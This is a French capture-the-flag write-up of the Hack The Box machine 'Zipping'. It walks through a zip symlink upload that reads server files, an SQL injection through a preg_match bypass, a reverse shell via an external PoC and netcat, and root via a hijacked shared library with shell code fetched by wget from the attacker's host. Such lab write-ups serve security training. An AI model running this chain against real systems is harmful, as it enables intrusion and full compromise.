  # Zipping

	echo "10.10.11.229 zipping.htb" >> /etc/hosts
	sudo masscan -p1-65535,U:1-65535 10.10.11.229 -e tun0 > ports.txt
	sudo nmap -p- -sV -T4 -A 10.10.11.229 -oN nmap.txt
	feroxbuster --silent -u http://zipping.htb
	
Scans classiques.

	PORT   STATE SERVICE VERSION
	22/tcp open  ssh     OpenSSH 9.0p1 Ubuntu 1ubuntu7.3 (Ubuntu Linux; protocol 2.0)
	80/tcp open  http    Apache httpd 2.4.54 ((Ubuntu))


Une page et un dossier très intéressants sont sortis par Feroxbuster : 

> ...
> <br>http://zipping.htb/uploads
> <br>http://zipping.htb/upload.php
> <br>...

Le dossier /uploads/ nous sort une erreur 403 mais la page upload.php est accessible et permet bien d'uploader des fichiers. Cette page permet de postuler en envoyant un CV. Le site précise que seul un fichier .zip sera accepté, et que ce dernier doit contenir un fichier au format PDF. En envoyant un fichier conforme, on obtient une URL de type **/uploads/365bde2d4d3a0e7d1d7f18d9cfb52779/fichier.pdf** 

Cela implique que le fichier est extrait en back end. Vu le nom de la VM, j'ai préféré cibler d'abord ce côté extraction avant de penser à l'upload arbitraire classique (null byte, double extension, ...).

Après un peu de documentation, on voit que les deux principales options dans ce cas de figure sont de faire télécharger des liens symboliques au serveur ou d'inclure des fichiers avec des caractères spéciaux pour tenter de remonter dans des dossiers supérieurs.

Voir : 
- https://book.hacktricks.xyz/v/fr/pentesting-web/file-upload 
- https://levelup.gitconnected.com/zip-based-exploits-zip-slip-and-zip-symlink-upload-21afd1da464f

J'ai commencé par essayer de lire **/etc/passwd** : 

	ln -s /etc/passwd passwd.pdf
	okular passwd.pdf
	zip --symlinks passwd.zip passwd.pdf

En allant sur le lien obtenu, on a une erreur indiquant que le document n'a pas pu être chargé. Mais en ouvrant la requête dans Burp ou avec Curl on voit bien le contenu du fichier /etc/passwd.

Le seul utilisateur qui semble intéressant à première vue est celui-ci : 
  
    rektsu:x:1001:1001::/home/rektsu:/bin/bash

Pas moyen d'obtenir de clé SSH, j'ai donc décidé de lire les sources : 

	echo "aaaa" > /var/www/html/upload.php
	ln -s /var/www/html/upload.php php.pdf
	zip --symlinks php.zip php.pdf
	...
	curl http://zipping.htb/uploads/abc3445778048c61c2f7727d8e346595/php.pdf --output upload.php

En répétant la même procédure pour index.php puis pour les autres pages que l'on peut trouver en suivant les différents codes sources **(/shop/home.php, /shop/cart.php, ...)** on finit par tomber sur un morceau très intéressant dans **cart.php** : 

	echo "aaaa" > /var/www/html/shop/cart.php
	ln  -s  ../../../../../../var/www/html/shop/cart.php php.pdf
	zip --symlinks php.zip php.pdf
	...
	curl http://zipping.htb/uploads/be9208c571675bc43a552b16c20b70ca/php.pdf --output cart.php
	cat cart.php

&nbsp; 

	if (isset($_POST['product_id'], $_POST['quantity'])) {
	    // Set the post variables so we easily identify them, also make sure they are integer
	    $product_id = $_POST['product_id'];
	    $quantity = $_POST['quantity'];
	    // Filtering user input for letters or special characters
	    if(preg_match("/^.*[A-Za-z!#$%^&*()\-_=+{}\[\]\\|;:'\",.<>\/?]|[^0-9]$/", $product_id, $match) || preg_match("/^.*[A-Za-z!#$%^&*()\-_=+{}[\]\\|;:'\",.<>\/?]/i", $quantity, $match)) {
	        echo '';
	    } else {
	        // Construct the SQL statement with a vulnerable parameter
	        $sql = "SELECT * FROM products WHERE id = '" . $_POST['product_id'] . "'";
	
Le back end vérifie ce que l'on envoie à cette page avec la fonction **preg_match()** qui est connue pour être vulnérable.
<br>Voir : https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp#preg_match-. 

En achetant une montre et en surveillant l'historique Burp, on peut facilement trouver et reproduire la requête HTTP POST que l'on veut exploiter : 

	POST /shop/index.php?page=cart HTTP/1.1
	[...]
	quantity=1&product_id=3

Je n'ai pas réussi à finir l'exploitation de preg_match() moi-même mais j'ai trouvé un PoC déjà fait : https://github.com/saoGITo/HTB_Zipping/blob/main/HTB_Zipping_poc.py

	python poc.py 10.10.16.5 9999
	rlwrap nc -nvlp 9999
	...
	whoami
	cd /home/rektsu/
	cat user.txt
	

## Élévation de privilèges

	python3 -c "import pty ; pty.spawn('/bin/bash');"
	sudo -l 

>User rektsu may run the following commands on zipping:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(ALL) NOPASSWD: /usr/bin/stock

	file /usr/bin/stock
	strings /usr/bin/stock

On remarque un morceau intéressant : 

> St0ckM4nager <br>/root/.stock.csv <br>Enter the password: <br>Invalid password, please try again.

On va pouvoir entrer ce mot de passe pour utiliser l'application : 

	sudo /usr/bin/stock

Rien de spécial, on peut juste modifier des articles avec des menus à numéros.

	strace /usr/bin/stock

Après avoir entré le mot de passe, on remarque la ligne suivante : 

> openat(AT_FDCWD, "/home/rektsu/.config/libcounter.so", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)

Visiblement, ce script fait appel à une librairie située dans notre /home/
<br>Il est donc possible de générer une librairie factice, et de faire exécuter ce que l'on veut au système en tant que root : 

	wget http://10.10.16.5/shell.c
	mv /home/rektsu/.config/libcounter.so /home/rektsu/.config/libcounter.so_old
	gcc -shared -o /home/rektsu/.config/libcounter.so -fPIC shell.c
	sudo /usr/bin/stock
	...
	whoami
	cat /root/root.txt


	


